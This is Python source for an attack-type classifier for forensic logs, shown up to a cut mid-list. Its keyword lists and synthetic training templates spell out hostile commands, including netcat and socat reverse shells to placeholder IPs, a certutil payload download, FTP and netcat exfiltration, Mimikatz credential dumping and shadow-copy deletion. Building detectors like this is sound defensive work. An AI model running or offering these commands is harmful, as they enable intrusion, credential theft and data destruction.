"""
Supervised attack-type classifier for forensic event sessions.

Works on any log format — features are extracted from raw event text
and structural properties.  Windows EventIDs are not required.

Ten specialized attack categories trained on a mix of:
  - Real labeled sessions loaded from JSONL scenario files in sample_data/
  - Synthetic sessions generated from MITRE ATT&CK-derived templates

Real session data is augmented via random subwindow sampling to produce
~20 training variants per scenario file.  Synthetic data fills the
remainder up to n_per_class=500 per category (4,800–5,200 total samples).

Pattern vocabulary derived from:
  EVTX-ATTACK-SAMPLES (sbousseaden), BOTS v3 (Splunk), OTRF Security
  Datasets, Windows Security Auditing documentation, Sysmon schema,
  Linux auditd records, MITRE ATT&CK technique pages, public tool docs
  (Mimikatz, Rubeus, Impacket, Cobalt Strike, CrackMapExec, BloodHound).
"""

from __future__ import annotations

import json as _json
import logging
import math
import random
from dataclasses import dataclass, field
from pathlib import Path as _Path
from typing import Optional

logger = logging.getLogger(__name__)

try:
    from sklearn.ensemble import RandomForestClassifier
    import numpy as np
    _SKLEARN = True
except ImportError:
    _SKLEARN = False
    logger.warning("scikit-learn not available — using keyword-only attack classification")

# ── Attack taxonomy ───────────────────────────────────────────────────────────

ATTACK_CATEGORIES: list[str] = [
    "ransomware",
    "kerberoasting",
    "lateral_movement",
    "credential_theft",
    "data_exfiltration",
    "c2_communication",
    "persistence",
    "privilege_escalation",
    "defense_evasion",
    "reconnaissance",
]

ATTACK_META: dict[str, dict] = {
    "ransomware":           {"label": "Ransomware",           "color": "#dc2626", "mitre": ["T1486", "T1490", "T1489"]},
    "kerberoasting":        {"label": "Kerberoasting",        "color": "#7c3aed", "mitre": ["T1558.003", "T1558.001"]},
    "lateral_movement":     {"label": "Lateral Movement",     "color": "#b45309", "mitre": ["T1021", "T1570", "T1534"]},
    "credential_theft":     {"label": "Credential Theft",     "color": "#be123c", "mitre": ["T1003", "T1555", "T1552"]},
    "data_exfiltration":    {"label": "Data Exfiltration",    "color": "#0369a1", "mitre": ["T1048", "T1041", "T1567"]},
    "c2_communication":     {"label": "C2 Communication",     "color": "#065f46", "mitre": ["T1071", "T1095", "T1572"]},
    "persistence":          {"label": "Persistence",          "color": "#78350f", "mitre": ["T1053", "T1547", "T1543"]},
    "privilege_escalation": {"label": "Privilege Escalation", "color": "#831843", "mitre": ["T1068", "T1078", "T1134"]},
    "defense_evasion":      {"label": "Defense Evasion",      "color": "#1e3a5f", "mitre": ["T1070", "T1027", "T1036"]},
    "reconnaissance":       {"label": "Reconnaissance",       "color": "#3f6212", "mitre": ["T1082", "T1018", "T1087"]},
}

# ── Keyword dictionary (lowercase, substring matching) ────────────────────────
# Covers Windows, Linux, macOS, AWS/Azure/GCP CloudTrail, network logs, tools.

_KEYWORDS: dict[str, list[str]] = {
    "ransomware": [
        "vssadmin delete shadows", "delete shadows", "shadow cop",
        "wbadmin delete", "bcdedit /set", "bcdedit recoveryenabled",
        "cipher /e", "ransom", ".locked", ".encrypted", ".crypto", ".ryuk", ".conti",
        "restore_files", "wana", "wannacry", "lockbit", "revil", "sodinokibi",
        "del /f /q", "for /r", "mass file", "file encryption",
        "openssl enc", "aes-256-cbc", "gpg --encrypt", "gpg -e",
        "s3:deleteobject", "kms:encrypt", "chmod 000",
        "wmic shadowcopy delete", "readme_restore", "readme_decrypt",
        "inhibit system recovery", "data encrypted for impact",
        "blackcat", "alphv", "blackbasta", "clop", "cl0p", "hive ransomware",
        "net stop vss", "net stop wbengine", "taskkill /im", "terminate service",
        "for /r c:\\ %f in", "mass file modification", "extension renamed",
        "ransom note dropped", "double extortion", "data before encryption",
    ],
    "kerberoasting": [
        "kerberoast", "kerberos service ticket", "ticket granting service",
        "rc4-hmac", "rc4_hmac", "0x17", "etype 23", "etype23",
        "as-rep roasting", "as_rep", "spn scan", "service principal name",
        "krbtgt", "4769", "getuserspns", "getnpusers", "rubeus",
        "impacket", "ticket options", "encryption type: rc4", "etype: 23",
        "roastable", "kerberoastable", "kerberos ticket",
        "rc4 hmac", "arcfour", "kvno", "kinit", "klist",
        "4768", "pa-etype", "encryption downgrade", "overpassthehash",
        "ticket options: 0x40810", "aes256-cts", "constrained delegation",
        "unconstrained delegation", "s4u2proxy", "s4u2self",
        "asreproast", "pass-the-ticket", "forged pac", "diamond ticket",
    ],
    "lateral_movement": [
        "psexec", "wmicexec", "smbexec", "atexec", "dcomexec", "crackmapexec",
        "pass-the-hash", "pass the hash", "pth attack",
        "net use \\\\", "admin$", "c$", "ipc$",
        "logon type: 3", "logon type 3", "network logon",
        "invoke-wmimethod", "invoke-command", "new-pssession", "enter-pssession",
        "wmiexec", "winrm", "powershell remoting",
        "mstsc", "xfreerdp", "rdesktop", "rdp logon",
        "lateral movement", "pivot", "hop to",
        "ssh -i", "scp -i", "rsync --rsh",
        "sts:assumerole", "switch role", "cross-account access",
        "5145", "5140", "psexesvc", "wmiprvse", "atsvc", "samr",
        "4776", "smbclient", "evil-winrm", "evilwinrm",
        "zerologon", "cve-2020-1472", "logon type: 10", "logon type 10",
        "network share accessed", "remote interactive", "pass-the-ticket lateral",
    ],
    "credential_theft": [
        "mimikatz", "lsass.exe", "sekurlsa", "procdump -ma lsass",
        "comsvcs.dll minidump", "ntds.dit", "sam database", "sam hive",
        "credential dump", "hashdump", "dcsync", "dc sync",
        "drsuapi", "replication get-nc", "golden ticket", "silver ticket", "diamond ticket",
        "wdigest cleartext", "credential manager",
        "password spray", "brute force login", "credential stuffing",
        "responder", "hashcat", "john the ripper", "ntlm relay",
        "/etc/shadow", "/etc/passwd dump", "pam_unix",
        "getpasswords", "kerberostickets", "lsadump",
        "secretsmanager:getsecretvalue", "ssm:getparameter",
        "process accessed", "0x1fffff", "privilege::debug",
        "lsadump::sam", "lsadump::lsa", "kerberos::ptt",
        "dpapi::", "vault::cred", "targetimage lsass",
        "sharpdpapi", "secretsdump", "reg save hklm\\\\sam",
        "reg save hklm\\sam", "ntlmrelayx", "shadow credentials",
        # Phishing-delivered credential theft (MITRE T1566 → T1003)
        "winword.exe", "excel.exe spawning", "macro_runner", "macro runner",
        "wscript.exe macro", "parent: winword", "parent: excel",
        "office macro", "malicious document", "phishing attachment",
        "mshta credential", "sedebugprivilege seimpersonateprivilege",
        "bad password logon", "failed logon bad password",
        "stage2.exe", "stage1.exe", "dropped payload credential",
        "mimi", "rundll32 temp", "mimilib",
    ],
    "data_exfiltration": [
        "exfiltrat", "data theft", "data exfil",
        "7z a", "zip -r", "rar a", "tar czf",
        "curl -t", "curl --upload-file", "wget --post-file",
        "ftp put", "sftp put", "ftps upload",
        "dnscat", "dns tunnel", "iodine", "dns exfil", "dns covert",
        "large transfer", "bytes_out", "upload complete", "outbound data",
        "rclone copy", "rclone sync", "megaupload", "gdrive upload",
        "xcopy /s", "robocopy /mir", "certutil -encode",
        "s3:getobject", "listbuckets", "s3:copyobject",
        "staging directory", "data staged", "collection complete",
        "split -b", "base64 -w 0", "dd if=/dev/sda",
        "dropbox api", "invoke-restmethod", "api.dropboxapi",
        "transfer.sh", "webhook.site", "file.io",
        "large outbound", "bulk file copy", "4.2gb", "data collection",
    ],
    "c2_communication": [
        "beacon", "beaconing", "c2 server", "command and control", "c&c",
        "reverse shell", "bind shell", "reverse tcp", "bind tcp",
        "netcat", "nc.exe", "ncat", "socat relay",
        "cobalt strike", "cobaltstrike", "metasploit", "meterpreter", "msf",
        "empire agent", "sliver", "brute ratel", "havoc", "covenant",
        "shellcode", "reflective dll", "process inject", "stager", "payload.exe",
        ":4444", ":8443", ":9001", ":1337", ":31337",
        "high port connection", "non-standard port", "unusual port",
        "periodic connection", "sleep interval", "jitter",
        "encoded payload", "obfuscated command",
        # Web shell C2 (MITRE T1505.003) — attacker-controlled webshell as C2 channel
        "webshell", "web shell", "aspx shell", "php shell", "jsp shell",
        "china chopper", "phpspy", "weevely", "b374k", "c99 shell",
        "shell.php", "cmd.php", "upload.php", "image.php?cmd=",
        "post /shell", "http post command execution", "web shell command",
        "iis worker spawning cmd", "w3wp.exe spawning", "httpd spawning",
        "apache spawning cmd", "nginx spawning", "sqlservr spawning",
        "external allow outbound", "inbound 80 allow outbound 443",
        "internet-facing server outbound", "webserver outbound callback",
        "pipe created", "pipe connected", "msse-", "createremotethread",
        "malleable c2", "teamserver", "grpc", "named pipe c2",
        "check-in", "checkin", "implant", "agent.exe --connect",
        "sleep 60", "jitter 20", "beacon stage", "stage retrieval",
        "periodic beaconing", "c2 callback", "operator command",
    ],
    "persistence": [
        "schtasks /create", "at.exe /add", "scheduled task created",
        "currentversion\\run", "currentversion\\runonce",
        "reg add hkcu", "reg add hklm",
        "startup folder", "login item", "launch agent", "launchdaemon",
        "sc create", "sc config", "new-service", "service installed",
        "wmi subscription", "wmi event filter", "commandlineeventconsumer",
        "logon script", "userinitmprlogonscript", "gp script",
        "crontab -e", "/etc/cron.d/", "systemd unit", ".service enable",
        "iam user created", "createuser", "attachrolepolicy",
        "lambda trigger", "cloudwatch event rule",
        "4698", "7045", "4657", "image file execution options",
        "appinit_dlls", "bitsadmin", "winlogon",
        "accessibility", "sethc", "osk.exe", "utilman.exe",
        "print provider", "boot execute", "appcertdlls",
        "screensaver", "netsh helper", "port monitor dll",
        "authorized_keys", "ssh backdoor", "shim database",
    ],
    "privilege_escalation": [
        "uac bypass", "eventvwr.exe bypass", "fodhelper", "sdclt bypass",
        "token impersonation", "token theft", "juicypotato", "rottenpotato",
        "printspoofer", "sweetpotato",
        "seimpersonateprivilege", "seassignprimarytokenprivilege", "sedebugprivilege",
        "net localgroup administrators /add", "added to administrators",
        "runas /user:", "sudo su", "sudo -s", "sudo -i", "su - root",
        "setuid bit", "chmod +s", "suid binary", "sgid",
        "kernel exploit", "local privilege", "privilege escalation",
        "dll hijacking", "dll search order", "dll planting",
        "elevated integrity", "high integrity level", "full token elevation",
        "iam:passrole", "iam:attachuserpolicy", "admin access granted",
        "4672", "spoolsv", "printnightmare", "cve-2021-34527",
        "alwaysinstallelevated", "unquoted service path",
        "secondary logon", "seclogon", "lpe", "local privilege escalation",
        "dirtypipe", "cve-2022-0847", "pkexec", "cve-2021-4034",
        "docker escape", "container escape", "k8s rbac",
        "token elevation type: tokenelevatyiontypefull",
        "tokenelevationtypefull",
    ],
    "defense_evasion": [
        "event log cleared", "security log cleared", "wevtutil cl security",
        "auditpol /clear", "1102", "system log cleared",
        "timestomp", "timestamp modified",
        "process injection", "reflective injection", "process hollowing",
        "masquerading", "renamed to svchost", "binary renamed",
        "-encodedcommand", "encodedcommand", "-enc powershell",
        "base64 encoded", "iex (new-object", "downloadstring",
        "lolbas", "lolbin", "living off the land", "signed binary proxy",
        "set-mppreference -disablerealtimemonitoring",
        "add-mppreference -exclusionpath",
        "netsh advfirewall set allprofiles state off",
        "unset histfile", "history -c", "rm ~/.bash_history", "shred -u",
        "ld_preload=", "rootkit",
        "stoploggin", "deletetrail", "disabledetector", "disablerule",
        "amsi bypass", "amsiutils", "amsi.dll",
        "scriptblock logging", "etw", "invoke-obfuscation",
        "compress-archive", "obfuscated", "string replace",
        "disable logging", "module logging",
        "sysmon unload", "fltmc unload", "driver unload",
        "cloudtrail stoplogs", "guardduty disable",
    ],
    "reconnaissance": [
        "nmap -", "masscan", "zmap", "port scan", "portscan", "port sweep",
        "ping sweep", "arp scan", "host discovery",
        "ldapsearch", "net user /domain", "net group /domain",
        "nltest /dclist", "nltest /domain_trusts", "dsquery user",
        "bloodhound", "sharphound", "adrecon", "powerview",
        "get-domainuser", "get-domaingroup", "get-domaincomputer",
        "whoami /all", "whoami /priv", "ipconfig /all", "ifconfig",
        "systeminfo", "uname -a", "cat /etc/os-release",
        "net view", "net share", "arp -a", "netstat -an", "route print",
        "dnsenum", "dnsrecon", "fierce", "sublist3r",
        "nikto", "gobuster", "dirb", "wfuzz", "ffuf",
        "describeinstances", "listbuckets", "getcalleridentity", "listusers",
        "find-localadminaccess", "invoke-acl", "dsget",
        "ldapdomaindump", "smb signing not required",
        "crackmapexec --shares", "4661", "admodule",
        "snmp walk", "snmpwalk", "enum4linux", "rpcclient",
        "wmic os get", "wmic computersystem", "wmic process list",
    ],
}

# ── Synthetic training templates (realistic log text per attack category) ──────

_TEMPLATES: dict[str, list[str]] = {
    "ransomware": [
        "New Process Name: C:\\Windows\\System32\\vssadmin.exe Process Command Line: vssadmin.exe Delete Shadows /All /Quiet Token Elevation Type: TokenElevationTypeFull",
        "New Process Name: C:\\Windows\\System32\\wbadmin.exe Process Command Line: wbadmin.exe delete catalog -quiet backup catalog destroyed",
        "New Process Name: C:\\Windows\\System32\\bcdedit.exe Process Command Line: bcdedit.exe /set {default} recoveryenabled No boot recovery disabled",
        "New Process Name: C:\\Windows\\System32\\bcdedit.exe Process Command Line: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures",
        "New Process Name: C:\\ProgramData\\Microsoft\\lb.exe Process Command Line: lb.exe --path C:\\ --ext .doc,.docx,.xls,.xlsx,.pdf,.sql,.mdf,.bak --threads 12. LockBit 3.0 ransomware mass file encryption",
        "Process Command Line: cmd.exe /c for /r C:\\FileShares %f in (*.bak *.sql *.mdf) do del /f /q inhibit system recovery",
        "Process Command Line: icacls C:\\FileShares /deny Everyone:(OI)(CI)F /t permissions locked ransomware post-encryption",
        "Process Command Line: wmic.exe shadowcopy delete LockBit secondary VSS cleanup shadow copies removed",
        "Ransom note LockBit_README.txt dropped in all directories ransom demand bitcoin",
        "New Process Name: C:\\Windows\\System32\\wevtutil.exe Process Command Line: wevtutil.exe cl Security wevtutil cl System wevtutil cl PowerShell anti-forensics",
        "New Process Name: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Process Command Line: powershell.exe -NonInteractive -EncodedCommand Set-MpPreference -DisableRealtimeMonitoring 1 Defender disabled before encryption",
        "certutil.exe -urlcache -split -f http://185.234.219.42:8080/payload/lb.exe C:\\ProgramData\\Microsoft\\lb.exe ingress tool transfer ransomware download",
        "File extension renamed from .xlsx to .xlsx.ryuk ransomware encrypted extension",
        "openssl enc -aes-256-cbc -e -in /home/user/data.tar -out /tmp/data.enc Linux ransomware encryption",
        "s3:DeleteObject called 1247 times on bucket prod-backups AWS ransomware cloud",
        "kms:encrypt operation 3891 files via API cloud ransomware encryption impact",
        "Mass file modification 2048 files modified within 60 seconds ransomware encryption in progress",
        "Ransom note README_DECRYPT.txt dropped ransom demand bitcoin wallet address",
        "LockBit 3.0 dropper executed ransomware family IoC",
        "REvil sodinokibi ransomware affiliate toolkit detected",
        "Conti ransomware execution mass file encryption .conti extension",
        "File recovery disabled bcdedit recoveryenabled No ransomware anti-recovery",
        "Process Command Line: net stop vss && net stop wbengine && net stop swprv && net stop SDRSVC backup services killed before ransomware encryption",
        "Process Command Line: taskkill /im sql*.exe /f && taskkill /im oracle*.exe /f database processes killed before ransomware encryption",
        "BlackCat ALPHV ransomware execution --access-token lateral propagation double extortion data before encryption",
        "BlackBasta ransomware dropper stage1 executed mass file encryption network share propagation",
        "cl0p clop ransomware MOVEit exploitation mass file encryption data exfiltration before encryption",
        "Process Command Line: cmd.exe /c for /r C:\\ %f in (*.doc *.pdf *.xlsx) do cipher /e mass file encryption ransom",
        "Data exfiltration before encryption double extortion ransomware operation 4.2GB transferred",
        "Inhibit system recovery ransomware bcdedit vssadmin wbadmin all backup mechanisms disabled",
        "Shadow copy deletion wbadmin delete catalog vssadmin delete shadows ransomware inhibit recovery",
        "Ransom demand Tor onion site payment instructions README_FILES.txt ransomware note",
        "Mass file rename encrypted extension .locked ransomware post-encryption file modification",
        "Terminate services before encryption ransomware preparation av security disabled",
        "Volume shadow copy deleted all snapshots removed ransomware recovery prevention",
    ],
    "kerberoasting": [
        "A Kerberos service ticket was requested. Account Name: jdoe@CORP.LOCAL Service Name: MSSQLSvc/SQLSERVER-01.corp.local:1433 Ticket Encryption Type: 0x17 Failure Code: 0x0. CRITICAL etype 0x17 RC4-HMAC weak cipher kerberoastable",
        "A Kerberos service ticket was requested. Account Name: jdoe@CORP.LOCAL Service Name: HTTP/WEBSERVER-01.corp.local Ticket Options: 0x40810000 Ticket Encryption Type: 0x17. RC4-HMAC kerberoasting ticket granting service",
        "A Kerberos service ticket was requested. Account Name: jdoe@CORP.LOCAL Service Name: CIFS/FILESERVER-01.corp.local Ticket Encryption Type: 0x17 Failure Code: 0x0. Third rc4_hmac service ticket 37 seconds kerberoast burst",
        "Event 4769 burst 4 ticket requests in 54 seconds Ticket Encryption Type 0x17 RC4-HMAC kerberoasting IOC single workstation",
        "powershell.exe -Command Import-Module PowerView.ps1 Get-DomainUser -SPN samaccountname serviceprincipalname SPN enumeration kerberoastable accounts",
        "powershell.exe -Command Add-Type -AssemblyName System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken MSSQLSvc manual TGS ticket request kerberoast",
        "GetUserSPNs.py -request CORP.LOCAL/jdoe -dc-ip 10.0.0.10 15 kerberoastable accounts found impacket",
        "Rubeus kerberoast /outfile:hashes.txt ticket extraction from memory rc4-hmac",
        "TGS-REP with RC4-HMAC encryption for SPN HTTP/webserver01.corp.local kerberoasting",
        "AS-REP roasting GetNPUsers.py CORP.LOCAL user does not require pre-auth as_rep asreproast",
        "Event 4769 krbtgt ticket request etype 23 RC4-HMAC kerberoastable",
        "hashcat -m 13100 --force hashes.txt rockyou.txt Kerberos TGS hash offline cracking",
        "john --format=krb5tgs hashes.txt service ticket offline cracking kerberoast",
        "SPNs enumerated via LDAP Get-DomainUser -SPN PowerView 28 service accounts spn scan",
        "Ticket encryption type 0x17 RC4-HMAC gold standard Kerberoasting indicator etype 23",
        "Rubeus asreproast outfile asrep.txt AS-REP roasting no pre-authentication",
        "DCSync attack following kerberoasting krbtgt hash golden ticket lsadump::dcsync",
        "Logon GUID all-zeros forged Kerberos ticket golden ticket post-kerberoasting",
        "DS-Replication-Get-Changes DS-Replication-Get-Changes-All Event 4662 DCSync kerberoasting",
        "impacket GetUserSPNs Found SPN MSSQLSvc sql01 1433 svc_sql kerberoastable account",
        "Multiple 4769 events etype 0x17 same source IP short interval kerberoast campaign",
        "Rubeus kerberoast /rc4opsec /outfile:hashes.txt RC4 only kerberoastable accounts opsec-safe",
        "A Kerberos authentication ticket was requested Event 4768 pre-authentication failure PA-ENC-TIMESTAMP",
        "Encryption downgrade attack Kerberos RC4 forced over AES256 kerberoasting downgrade",
        "OverPass-The-Hash overpassthehash Mimikatz RC4 NTLM hash to Kerberos TGT lateral",
        "Pass-the-ticket kerberos::ptt golden ticket injected current session Mimikatz",
        "Constrained delegation S4U2Proxy S4U2Self Kerberos ticket abuse service account",
        "Unconstrained delegation machine account TGT harvested kerberoasting pivot DC",
        "Diamond ticket forged PAC Kerberos ticket post-kerberoasting full domain compromise",
        "Cross-realm trust abuse Kerberos inter-forest ticket kerberoasting trust attack",
        "4769 etype 0x17 burst rate 10 tickets 90 seconds kerberoast automated tooling",
        "Ticket options 0x40810010 common Rubeus kerberoast flag Ticket Encryption Type 23",
        "AES256-CTS-HMAC-SHA1 downgraded to RC4-HMAC kerberoasting encryption downgrade detection",
        "krb5tgs hash format $krb5tgs$23$* captured offline cracking kerberoasting",
        "Impacket GetUserSPNs -request -dc-ip kerberoast ticket extraction 15 SPNs found",
    ],
    "lateral_movement": [
        "New Process Name: C:\\Windows\\PSEXESVC.exe Creator Process: C:\\Windows\\System32\\cmd.exe psexec lateral movement SMB remote service execution",
        "Process Command Line: cmd.exe /c certutil.exe -urlcache -split -f http://185.234.219.42 Creator: C:\\Windows\\PSEXESVC.exe lateral movement ingress tool",
        "An account was successfully logged on. Logon Type: 3 Network Account Name: jdoe Source Network Address: 10.0.0.50 Workstation: WORKSTATION-01 Authentication: NTLM lateral movement network logon",
        "An account was successfully logged on. Logon Type: 3 Network Account Name: Administrator Source Address: 10.0.0.10 FILESERVER-01 lateral movement pivot DC to fileserver",
        "Process Command Line: cmd.exe /c whoami && net user /domain Logon Type 3 network logon PSEXESVC lateral pivot post-exploitation",
        "Process Command Line: invoke-command -ComputerName BACKUPSERVER-01 -ScriptBlock WinRM lateral movement PowerShell remoting",
        "New-PSSession -ComputerName HRSERVER-01 -Credential remote PowerShell session lateral hop",
        "Process Command Line: wmic.exe /node:10.0.0.60 process call create cmd.exe WMI remote process creation lateral movement",
        "Process Command Line: mstsc.exe /v:10.0.0.55 RDP connection lateral movement remote desktop",
        "SSH -i /tmp/.sysupd/id_rsa -o StrictHostKeyChecking=no root@10.0.0.60 lateral movement SSH key",
        "pass-the-hash attack NTLM hash credential lateral logon type 3 network",
        "CrackMapExec smb 10.0.0.0/24 -u jdoe -H ntlm_hash lateral movement spray",
        "STS:AssumeRole cross-account lateral movement prod account AWS cloud",
        "User jdoe accessed FILESERVER-01 BACKUPSERVER-01 HRSERVER-01 15 minutes network logon lateral",
        "dcomexec.py CORP/jdoe 10.0.0.70 cmd.exe DCOM lateral movement pivot",
        "atexec.py CORP/jdoe 10.0.0.60 scheduled task lateral execution",
        "Enter-PSSession remote PowerShell session lateral movement hop winrm",
        "An account successfully logged on Logon Type 3 from 5 unique hosts 30 minutes lateral movement",
        "SMB connection admin$ share 3 hosts 10 minutes PsExec lateral movement",
        "Logon Type 10 RemoteInteractive RDP session lateral movement remote desktop",
        "Pass-the-ticket golden ticket lateral Logon GUID all-zeros forged Kerberos",
        "A network share object was checked to see whether client can be granted desired access Share Name ADMIN$ PsExec lateral movement 5145",
        "PSEXESVC.exe created on remote target lateral movement service installation SMB",
        "WmiPrvSE.exe spawning cmd.exe WMI remote process creation lateral movement T1047",
        "5140 network share object accessed ADMIN$ C$ share lateral movement SMB",
        "5145 network share file check ADMIN$ PsExec staging lateral movement",
        "Logon Type 3 five unique hosts eight minutes network logon lateral movement spray",
        "smbexec.py impacket remote service creation SMB lateral execution pass-the-hash",
        "Evil-WinRM evilwinrm PowerShell remoting lateral movement WinRM 5985 5986",
        "Zerologon CVE-2020-1472 domain controller account password reset lateral to DC",
        "Pass-the-hash NTLM lateral logon type 3 four hosts twelve minutes spray",
        "WMI lateral process creation wmiprvse parent WmiPrvSE spawned cmd.exe on remote host",
        "PsExec admin$ share drop PSEXESVC service creation remote execution lateral T1021.002",
        "RDP lateral movement logon type 10 RemoteInteractive 3389 mstsc xfreerdp",
        "SSH lateral movement stolen key id_rsa StrictHostKeyChecking=no root pivot",
    ],
    "credential_theft": [
        "Process Command Line: powershell.exe -Command Invoke-Mimikatz -Command sekurlsa::logonpasswords -DumpCreds credential dump LSASS memory",
        "Process Command Line: powershell.exe -Command Invoke-Mimikatz -Command lsadump::dcsync /domain:corp.local /user:krbtgt DCSync krbtgt hash golden ticket",
        "Operation performed on object Object Type DS-Replication-Get-Changes DS-Replication-Get-Changes-All Event 4662 DCSync attack jdoe not domain controller",
        "Process Command Line: procdump.exe -ma lsass.exe lsass.dmp LSASS memory dump credential theft",
        "Process Command Line: rundll32.exe comsvcs.dll MiniDump lsass.exe lsass.dmp full LSASS dump credential",
        "NTDS.dit copied from C:\\Windows\\NTDS Active Directory database credential dump",
        "Attempted access to SAM database hive HKLM\\SAM credential extraction sam hive",
        "Golden ticket created krbtgt hash forged TGT credential theft mimikatz",
        "Responder captured NTLM hash LLMNR poisoning NTLMv2 credential",
        "Password spray 50 failed authentications 4625 12 accounts 5 minutes brute force credential",
        "hashcat -m 1000 ntlm_hashes.txt rockyou.txt NTLM offline cracking credential theft",
        "john --wordlist=rockyou.txt shadow.txt /etc/shadow offline cracking credential",
        "secretsmanager:GetSecretValue called 47 times non-service account AWS credential theft",
        "wdigest cleartext credentials WDigest authentication enabled mimikatz sekurlsa",
        "reg save HKLM\\SAM sam.bak SAM registry hive offline attack credential",
        "impacket secretsdump.py remote secrets extraction credential dump ntds",
        "LSASS memory access OpenProcess ReadProcessMemory credential theft lsass.exe",
        "ntds.dit volume shadow copy extraction credential theft active directory",
        "LaZagne credential harvesting tool browser database credential theft",
        "Process accessed SourceImage mimikatz TargetImage lsass.exe GrantedAccess 0x1FFFFF credential theft Sysmon Event 10",
        "Sysmon Event 10 process accessed targetimage lsass.exe grantedaccess 0x1fffff credential dump",
        "privilege::debug sekurlsa::logonpasswords lsadump::sam Mimikatz commands credential theft",
        "kerberos::ptt pass-the-ticket Mimikatz golden ticket injected session",
        "dpapi:: masterkey credential decryption DPAPI Chrome Firefox credential theft",
        "sharpdpapi triage credentials DPAPI master key credential theft",
        "reg save hklm\\sam hklm\\system sam hive offline NTLM extraction credential theft",
        "ntlmrelayx smb relay captured credential NTLM relay attack credential theft",
        "shadow credentials certificate abuse PKINIT Kerberos credential theft",
        "LaZagne browser database SSH git credential theft all passwords",
        "wce.exe -w Windows Credential Editor cleartext credential theft",
        "vssadmin create shadow ntds.dit extraction active directory credential theft",
        "Credential stuffing 200 login attempts breach credential list authentication",
        "NTLM relay ntlmrelayx responder poisoning credential capture relay",
        "DCSync lsadump::dcsync drsuapi DS-Replication credential dump all hashes",
        "secretsdump impacket domain all hashes extracted credential theft active directory",
        # Phishing-delivered credential theft (T1566 → T1003 chain)
        "New process. Image: C:\\Windows\\System32\\wscript.exe. Parent: WINWORD.EXE macro_runner credential theft phishing delivery",
        "WINWORD.EXE spawning wscript.exe macro runner office macro execution credential theft phishing",
        "Special privileges assigned SeDebugPrivilege SeImpersonatePrivilege stage2.exe credential theft payload",
        "Process Command Line: rundll32.exe C:\\Windows\\Temp\\mimi credential dump phishing delivery mimikatz",
        "New process. Image: C:\\Windows\\Temp\\stage2.exe. Parent: powershell.exe. CommandLine: stage2.exe -c C2 credential theft stager",
        "Account failed to log on Bad password logon type 3 multiple failures password spray credential theft",
        "wscript.exe /b macro_runner.vbs WINWORD phishing macro execution credential theft delivery",
        "rundll32.exe Windows\\Temp mimilib credential dump phishing payload",
        "SeDebugPrivilege SeImpersonatePrivilege assigned stage2 dropped payload credential theft",
        "Office macro execution WINWORD wscript cmd powershell credential theft chain T1566 T1003",
    ],
    "data_exfiltration": [
        "Process Command Line: powershell.exe -Command Invoke-RestMethod -Method Post -Uri https://api.dropboxapi.com/2/files/upload Authorization Bearer token -InFile backup_nov22.b64. Dropbox API 4.2GB base64-encoded archive exfiltrated",
        "Process Command Line: robocopy.exe HRSERVER-01\\HRData\\ staging\\ /E /R:0 /W:0 /NFL /NDL bulk recursive file copy 1847 files staging data exfiltration",
        "Process Command Line: 7z.exe a -p Corp2024 -mhe=on backup_nov22.7z staging\\ 7-Zip AES-256 encryption header encryption data staging",
        "Process Command Line: certutil.exe -encode backup_nov22.7z backup_nov22.b64 base64 encoding bypass DLP content inspection data exfiltration",
        "tar czf - /var/www/html /etc/nginx ssh 194.165.16.15 cat webserver_loot.tar.gz data exfiltration via SSH pipe no staging file",
        "find /var/www /etc/nginx /home -name wp-config.php .env grep password secret key token credential harvesting web server",
        "curl -T /tmp/database_dump.tar.gz ftp://203.0.113.1/uploads/ data exfil FTP",
        "Large outbound transfer 4.2GB 185.220.101.42 port 443 data exfiltration HTTPS",
        "7z a -p secret /tmp/archive.7z /home/user/Documents/ compression before exfil",
        "rclone copy /data/sensitive remote:exfil-bucket cloud storage exfil data",
        "dnscat2 DNS tunnel established attacker-controlled DNS server data exfil",
        "S3:GetObject 8471 objects downloaded prod-database-backups bucket exfil",
        "DNS query volume spike 3200 TXT record queries 10 minutes DNS tunnel data",
        "Data staging /tmp/staging/ 4.7GB compressed archives exfil collection",
        "S3:CopyObject 1247 files external bucket attacker-exfil data exfiltration",
        "dd if=/dev/sda bs=512 gzip nc 203.0.113.42 9001 raw disk exfil",
        "sftp put bulk file transfer external server data exfiltration",
        "New-Object Net.WebClient UploadFile https://transfer.sh staging.7z HTTPS exfil PowerShell",
        "xcopy /s /e /q HRSERVER-01\\HRData staging 7z.exe compress exfil data collection",
        "Dropbox API upload 4.2GB base64-encoded archive OAuth Bearer token data exfiltration",
        "Robocopy HRSERVER finance payroll 4 shares bulk copy staging exfiltration",
        "certutil -encode bypass DLP base64 outbound data exfiltration",
        "robocopy /NFL /NDL suppress file listing 1847 files bulk copy staging exfiltration",
        "transfer.sh webhook.site file.io free file upload data exfiltration C2",
        "Large outbound transfer bytes_out 4200000000 external IP data exfiltration",
        "Staging directory C:\\Users\\AppData\\Local\\Temp\\staging 7z AES-256 encryption collection",
        "iodine DNS tunnel data exfiltration covert channel DNS TXT records",
        "base64 -w 0 curl -d POST data exfiltration HTTP covert channel",
        "rclone sync large outbound cloud exfiltration megaupload gdrive",
        "Split large archive chunked exfil 100MB parts staged data exfiltration",
        "Robocopy /MIR mirror entire share staging exfiltration data collection",
        "OneDrive SharePoint large upload personal cloud data exfiltration",
        "Exfiltration via HTTPS to external IP large bytes_out transfer data theft",
        "Collection staging compression encryption base64 exfiltration full chain",
        "xcopy /s recursive copy network share staging data collection exfiltration",
    ],
    "c2_communication": [
        "Cobalt Strike beacon periodic HTTP POST to 203.0.113.42/updates every 60s C2",
        "meterpreter session established to 203.0.113.5 port 4444 from WORKSTATION-01 C2",
        "netcat reverse shell nc -e /bin/bash 203.0.113.42 4444 C2 command control",
        "Empire agent check-in from 10.0.0.50 to C2 at 203.0.113.55 port 443",
        "Sliver implant beaconing every 45s to 185.220.101.5 on port 8443 C2",
        "Reflective DLL injection into explorer.exe Cobalt Strike beacon IoC",
        "HTTPS beacon disguised as Google Analytics traffic to 203.0.113.42 C2",
        "DNS C2 beacon.attacker.com TXT record queries every 30 seconds command control",
        "Socat relay socat TCP:203.0.113.1:9001 EXEC:/bin/bash C2 reverse shell",
        "Periodic connection 10.0.0.50 to 185.220.101.42 every 55-65 seconds jitter C2",
        "PowerShell IEX Invoke-Expression Net.WebClient DownloadString C2 stager",
        "shellcode injected into svchost.exe process hollowing C2 beacon",
        "Encoded stager -encodedcommand base64 C2 payload delivery",
        "Brute Ratel C4 agent check-in from compromised host C2 command control",
